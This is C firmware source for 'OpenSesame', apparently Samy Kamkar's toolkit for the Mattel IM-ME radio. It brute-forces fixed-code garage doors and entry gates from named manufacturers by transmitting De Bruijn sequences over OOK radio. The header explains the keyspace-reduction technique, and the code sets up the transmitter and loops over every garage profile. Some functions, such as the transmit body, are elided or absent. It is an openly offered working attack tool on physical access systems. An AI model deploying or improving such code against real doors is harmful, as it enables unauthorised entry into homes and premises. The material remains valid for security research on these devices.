/*
 * OpenSesame - Fixed-Code Garage/Gate Hacking Toolkit
 *  by Samy Kamkar
 *  http://samy.pl/opensesame
 *
 * Exploits small keyspace and a new vulnerability in garages/gates systems from:
 *  Chamberlain, Linear, Multi-code, Stanley, Moore-o-Matic, NSCD/North Shore Commercial Door
 *
 * built on the shoulders of giants:
 *  based off of opensesame/specan by Michael Ossmann,
 *  sprite/key code by Travis Goodspeed,
 *  LCD code by Dave
 *
 * This tool exploits an inherent weakness in most fixed code
 * garages doors to open them in seconds using a child's toy.
 *
 * Besides having common frequencies, baudrates, and modulation
 * schemes built in or quickly definable (garages.h), this tool
 * reduces a garage's code/pin keyspace by over 95%!
 *
 * For example, to brute force a 12-bit binary dipswitch remote,
 * (4096 12-bit combos + 4096 12-bit wait times) requires 98304 bits,
 * while my method only requires 4105 bits, 4.2% of the total time.
 *
 *
 * This is accomplished by:
 * a) producing a De Bruijn sequence of all possible *overlapping*
 * combos (reducing >90%), exploiting pin testing shift registers
 * b) removing wait periods between transmitted codes (reduces 50%)
 *
 * The De Bruijn sequence is the magic. As an example, if a garage
 * only accepted a 3-bit code, it would require 24 bits to brute force
 * the entire keyspace. However, the 10 bit de bruijn sequence
 * "0001011100" actually contains all possible 3-bit codes, but
 * overlapping. Most garage/entrygate systems use a shift register,
 * only popping a single bit off rather than the entire code out,
 * before pulling in a new bit, at which point the newly constructed
 * code is retested. As the bit sequence becomes longer, the percent
 * reduction actually increases.
 *
 * To brute force 12 bits (4096 12-bit combos + 4096 12-bit wait times)
 * requires 98304 bits, while the De Bruijn sequence requires 4105 bits
 * (4.2% of the required time to brute force the entire 12 bit keyspace).
 *
 * See `garages.h` for list of garages, or to add your own.
 *
 * Built for the Mattel IM-ME / CC1110.
 *
 * Copyright 2014-2015 Samy Kamkar
 * Copyright 2010 Michael Ossmann, Travis Goodspeed, Dave
 * See LICENSE/COPYING file
 *
 * DEVELOPERS:
 *	you can add more methods in garages.h
 *
 *
 */

/*
 * todo:
 *  anything that says /TODO/
 *  support setting txFast to 1 in realuserland
 *  selectable garage array
 *  customizable db sequence/params?
 *  build in mossmann's specan?
 *  don't send so much on last packet (change pkt len)
 */

/* Notes:
 *  LOCAL is defined when compiling via gcc for local testing
 *  SIMULATOR is defined when using s51 (ucsim), an 8051 simulator
 */

#include "types.h"
#ifndef LOCAL
#include <cc1110.h>
#endif
#include <math.h>
#include "ioCCxx10_bitdef.h"
#include "display.h"
#include "keys.h"
#include "garages.h"
#include "rf.h"
#include "fbuffer.h"
#include "zsprites.h"
#include "pm.h"

#define title printl(0, "    OpenSesame 1.0")
#define HIBYTE(a)     (u8) ((u16)(a) >> 8 )
#define LOBYTE(a)     (u8)  (u16)(a)

#define SET_WORD(regH, regL, word) \
	do {                           \
		(regH) = HIBYTE( word );   \
		(regL) = LOBYTE( word );   \
	} while (0)

/* note sdcc wants reverse bit order from datasheet */
typedef struct {
	u8 SRCADDRH;
	u8 SRCADDRL;
	u8 DESTADDRH;
	u8 DESTADDRL;
	u8 LENH      : 5;
	u8 VLEN      : 3;

	u8 LENL      : 8;

	u8 TRIG      : 5;
	u8 TMODE     : 2;
	u8 WORDSIZE  : 1;

	u8 PRIORITY  : 2;
	u8 M8        : 1;
	u8 IRQMASK   : 1;
	u8 DESTINC   : 2;
	u8 SRCINC    : 2;
} DMA_DESC;

__xdata static volatile u8 txdone = 1;
__xdata static volatile u8 ni = 0;

__xdata DMA_DESC dmaConfig;
__xdata u8 realbuf[MAXLEN+1];
__bit sleepy = 0;
__bit txFast = 0;

extern u8 _garage_id = 0;

void setup_dma_tx()
{
	// forum guy used high priority and repeated single mode (TMODE = 2)
	dmaConfig.PRIORITY       = 2;  // high priority
	dmaConfig.M8             = 0;  // not applicable
	dmaConfig.IRQMASK        = 0;  // disable interrupts
	dmaConfig.TRIG           = 19; // radio
	dmaConfig.TMODE          = 2;  // repeated single mode
	dmaConfig.WORDSIZE       = 0;  // one byte words;
	dmaConfig.VLEN           = 0;  // use LEN
	SET_WORD(dmaConfig.LENH, dmaConfig.LENL, MAXLEN);

	SET_WORD(dmaConfig.SRCADDRH, dmaConfig.SRCADDRL, realbuf);
	SET_WORD(dmaConfig.DESTADDRH, dmaConfig.DESTADDRL, &X_RFD);
	dmaConfig.SRCINC         = 1;  // increment by one
	dmaConfig.DESTINC        = 0;  // do not increment

	SET_WORD(DMA0CFGH, DMA0CFGL, &dmaConfig);

	return;
}

void setup()
{
#ifdef SIMULATOR
	UART_Init();
#else
	xtalClock();
	setIOPorts();
	configureSPI();
	LCDReset();

	/* IF setting */
	FSCTRL1   = 0x06;
	FSCTRL0   = 0x00;

	/* DC blocking enabled, OOK/ASK */
	MDMCFG2   = 0x30; // no preamble/sync

	/* no FEC, 4 byte preamble, default channel spacing */
	MDMCFG1   = 0x22;
	MDMCFG0   = 0xF8;

	FREND1    = 0x56;   // Front end RX configuration.
	FREND0    = 0x11;   // Front end RX configuration.

	/* automatic frequency calibration */
	MCSM0     = 0x14;
	//MCSM2 ?
	MCSM1     = 0x30; // TXOFF_MODE = IDLE

	FSCAL3    = 0xE9;   // Frequency synthesizer calibration.
	FSCAL2    = 0x2A;   // Frequency synthesizer calibration.
	FSCAL1    = 0x00;   // Frequency synthesizer calibration.
	FSCAL0    = 0x1F;   // Frequency synthesizer calibration.
	TEST2     = 0x88;   // Various test settings.
	TEST1     = 0x31;   // Various test settings.
	TEST0     = 0x0B;   // low VCO (we're in the lower 400 band)

	/* no preamble quality check, no address check */
	PKTCTRL1  = 0x04;

	/* no whitening, no CRC, fixed packet length */
	PKTCTRL0  = 0x00;

	/* device address */
	ADDR      = 0x11;

	/* packet length in bytes */
	PKTLEN    = MAXLEN;

	setup_dma_tx();
	clear();
#endif
}

int main(void)
{
	u8 key;

	setup();

	while (1)
	{
		title;
		//        "123456789 123456789 1"
		// TODO: make this stuff actually selectable
		printl(2, "Frequency");
		printrlc(2, 21-5, "Auto");
		printl(3, "Baud rate");
		printrlc(3, 21-5, "Auto");
		printl(4, "Bits");
		printrlc(4, 21-5, "Auto");

		// TODO: make this not a loop and use interrupts instead to catch keys
//		while (getkey() != ' ');
		while (1)
		{
			key = getkey();

			// tx!
			if (key == ' ') break;
			else if (key == KPWR)
			{
				sleepy = 1;
				chkSleep();
			}
		}

		// start de bruijn sending
		for (key = 0; key < sizeof(garages)/sizeof(garages[0]); key++)
		{
			_garage_id = key;
			db_send();
		}

		LED_GREEN = HIGH;
		LED_RED = HIGH;

		clear();
		//         "123456789 123456789 1"
		printrl(6, "TRANSMISSION COMPLETE");

	} // while
} // main


/* knock knock
 * - who's there
 * irq rf_vector
 * - irq rf---
 * INTERRUPTING SERVICE ROUTINE RF VECTOR COMPLETE (done transmitting)
 */
void rf_isr_orig() __interrupt (RF_VECTOR)
{
	// clear the interrupt flags
	RFIF &= ~RFIF_IRQ_DONE;
	S1CON &= ~0x03;           // Clear the general RFIF interrupt registers

	txdone = 1;

	// go idle again
	RFST = RFST_SIDLE;
	LED_RED = HIGH; // turn red led off
}

// transmit that badboy
void rftx()
{
	// wait for previous transmission to finish (if any)
	waitForTx();

	txdone = 0;
	LED_GREEN = HIGH; // turn green led off
	LED_RED = LOW; // turn red led on

	// ...
}

// show nyancat while transmitting
void waitForTx()
{
	while (!txdone)
	{
		if (!txFast)
		{
			// this slows down the tx quite a bit
			title;
			fb_blank();
			fb_bitblt((__xdata u8*) nyan[ni++], 30, 20, 0);
			fb_flush();
			//printl(0, "      OpenSesame    ");
			title;
			printl(1, "     Transmitting   ");
			if (ni >= NYANS)
				ni = 0;
		}
	}
}

// from Michael Ossmann's epic IM-ME spectrum analyzer:
void chkSleep()
{
	u8 i;
	/* go to sleep (more or less a shutdown) if power button pressed */
	if (sleepy)
	{
		clear();
		sleepMillis(1000);
		SSN = LOW;
		LCDPowerSave();
		SSN = HIGH;

		while (1)
		{
			sleep();

			/* power button depressed long enough to wake? */
			sleepy = 0;
			for (i = 0; i < DEBOUNCE_COUNT; i++)
			{
				sleepMillis(DEBOUNCE_PERIOD);
				if (keyscan() != KPWR) sleepy = 1;
			}
			if (!sleepy) break;
		}

		/* reset on wake */
		main();
		//setup();
		//goto reset;
	}

}
